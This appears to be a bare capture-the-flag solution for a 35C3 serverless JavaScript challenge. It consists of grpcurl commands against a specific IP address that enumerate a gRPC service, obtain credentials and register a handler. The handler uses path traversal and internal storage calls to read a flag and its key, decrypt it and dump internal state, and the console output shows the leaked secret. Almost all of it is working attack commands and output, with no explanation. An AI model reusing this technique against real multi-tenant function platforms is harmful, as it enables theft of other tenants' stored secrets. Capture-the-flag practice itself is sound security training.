# 



```
1) ./grpcurl -insecure 35.207.157.20:443 list

2) ./grpcurl -insecure 35.207.157.20:443 list c3.Lambda

3) ./grpcurl -insecure 35.207.157.20:443 c3.Lambda/Signup
{
	"cid": "c266ecaba718",
	"token": "20d00431eafb216702db5967b15977555688040245fb9812437736da986d3c21"
}

4) ./grpcurl -insecure -d '{"creds":{"cid": "c266ecaba718","token": "20d00431eafb216702db5967b15977555688040245fb9812437736da986d3c21"},"handler":{"endpoint":"t1","code":"function handle(args) {let flag = GetStorage(\"../espr/flag\"); console.log(flag);var key = _getmapex(\"espr/data/key\");console.log(key);let sex=sjcl.decrypt(key,flag);console.log(sex);console.log(JSON.stringify(this));return {\"status\": 200, \"reponse\":\"fucking\"};}"}}' 35.207.157.20:443 c3.Lambda/RegisterHandler
 
curl --insecure https://35.207.157.20/c266ecaba718/t1

=== CONSOLE.LOG ===
> {"iv":"OJ65vih25EIhqnN5qDUzNw==","v":1,"iter":10000,"ks":128,"ts":64,"mode":"ccm","adata":"","cipher":"aes","salt":"tiH4VV0FKjA=","ct":"MJg68A+0D5SUXlyAdMX9kG/oBDWcuPkoIOwR6E2tHM/NmyfnmZOc6fK/KHxzPb4="}

> bohjoo1thiew5aC8pielae7Toh8Hua9k
> 35C3_WePutV8InEverything_FlagLeakedOops
> {"sjcl":{"cipher":{},"hash":{},"keyexchange":{},"mode":{"ccm":{"name":"ccm","G":[]},"ocb2":{"name":"ocb2"},"gcm":{"name":"gcm"}},"misc":{"pa":{"bohjoo1thiew5aC8pielae7Toh8Hua9k":{"10000":{"firstSalt":[-1239287723,1560619568],"-1239287723,1560619568":[236581569,-167278005,-626963168,-516913937,-1769838773,761041322,159298297,865392245]}}}},"codec":{"utf8String":{},"hex":{},"base32":{"B":"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567","X":"0123456789ABCDEFGHIJKLMNOPQRSTUV","BITS":32,"BASE":5,"REMAINING":27},"base32hex":{},"base64":{"B":"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"},"base64url":{}},"exception":{},"bitArray":{},"random":{"c":[{"F":[1779033703,-1150833019,1013904242,-1521486534,1359893119,-1694144372,528734635,1541459225],"A":[],"l":0}],"m":[0],"P":0,"H":{},"N":0,"U":{},"ha":0,"o":0,"f":0,"Z":0,"b":[0,0,0,0,0,0,0,0],"h":[0,0,0,0],"M":6,"D":false,"K":{"progress":{},"seeded":{}},"ga":0,"u":0,"I":1,"J":2,"ca":65536,"T":[0,48,64,96,128,192,256,384,512,768,1024],"da":30000,"ba":80},"json":{"defaults":{"v":1,"iter":10000,"ks":128,"ts":64,"mode":"ccm","adata":"","cipher":"aes"}}},"G":false,"ipaddr":{},"cid":"c266ecaba718"}


```

